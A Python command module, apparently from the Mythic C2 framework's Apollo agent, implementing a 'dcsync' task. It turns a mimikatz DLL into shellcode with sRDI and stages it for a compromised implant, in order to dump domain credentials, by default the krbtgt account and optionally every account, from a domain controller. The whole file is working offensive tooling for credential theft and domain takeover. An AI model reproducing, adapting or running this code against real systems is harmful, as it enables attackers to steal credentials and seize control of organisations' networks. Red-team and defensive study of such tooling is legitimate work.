from mythic_payloadtype_container.MythicCommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from os import path
from mythic_payloadtype_container.MythicRPC import *


class DCSYNCArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "dc": CommandParameter(name="DC", type=ParameterType.String, default_value="", required=False, description="DC to target"),
            "domain": CommandParameter(name="Domain", type=ParameterType.String, default_value="", required=False, description="Domain to target (FQDN)"),
            "user": CommandParameter(name="User", type=ParameterType.String, default_value="krbtgt", required=False, description="Account to target (leave blank to dump all accounts)")
        }

    async def parse_command_line_args(self):
        cmdline_args = self.command_line.strip().split(" ")
        if len(cmdline_args) > 3:
            raise Exception("dcsync takes at most three parameters, but got: {}".format(self.command_line.strip()))
        for dcsync_arg in cmdline_args:
            parts = dcsync_arg.split(":")
            if len(parts) > 2:
                raise Exception("Invalid number of arguments or invalid separator in argument: {}".format(dcsync_arg))
            param = parts[0]
            val = parts[1]
            # I actually don't think we ever hit this, but whatever.
            if " " in val:
                raise Exception("No spaces allowed in value: {}".format(val))
            param = param[1:]
            if param == "dc":
                self.add_arg(param, val)
            elif param == "domain":
                self.add_arg(param, val)
            elif param == "user":
                self.add_arg(param, val)
            else:
                raise Exception("Invalid argument given to dcsync: {}".format(param))

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("DCSYNC requires arguments.")
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            await self.parse_command_line_args()
        self.add_arg("pipe_name", str(uuid4()))
        dc = self.get_arg("dc")
        domain = self.get_arg("domain")
        user = self.get_arg("user")
        if user and len(user.split(" ")) > 1:
            raise Exception("User argument cannot contain spaces, but was given: {}".format(user))
        if dc and len(dc.split(" ")) > 1:
            raise Exception("DC argument cannot contain spaces, but was given: {}".format(dc))
        if domain and len(domain.split(" ")) > 1:
            raise Exception("Domain argument cannot contain spaces, but was given: {}".format(domain))



class DCSYNCCommand(CommandBase):
    cmd = "dcsync"
    needs_admin = False
    help_cmd = "dcsync [/dc:domain_ip] [/domain:contoso.local] [/user:krbtgt]"
    description = "Use the MS-DRSR protocol to dump account credentials from a Domain Controller."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@elad_shamir"
    argument_class = DCSYNCArguments
    browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        dllFile = path.join(self.agent_code_path, f"mimikatz_{task.callback.architecture}.dll")
        dllBytes = open(dllFile, 'rb').read()
        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("smb_server_wmain"), task.args.get_arg("pipe_name").encode(), 0)
        file_resp = await MythicRPC().execute("create_file",
                                              task_id=task.id,
                                              file=base64.b64encode(converted_dll).decode(),
                                              delete_after_fetch=True)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
        else:
            raise Exception("Failed to register Mimikatz DLL: " + file_resp.error)
        dc = task.args.get_arg("dc")
        domain = task.args.get_arg("domain")
        user = task.args.get_arg("user")
        user_str = ""
        display_str = ""
        if user:
            user_str = "/user:{}".format(user)
        else:
            user_str = "/all"
        if dc:
            display_str += "/dc:{} ".format(dc)
        if domain:
            display_str += "/domain:{} ".format(domain)
        display_str += user_str
        task.display_params = display_str
        return task

    async def process_response(self, response: AgentResponse):
        pass
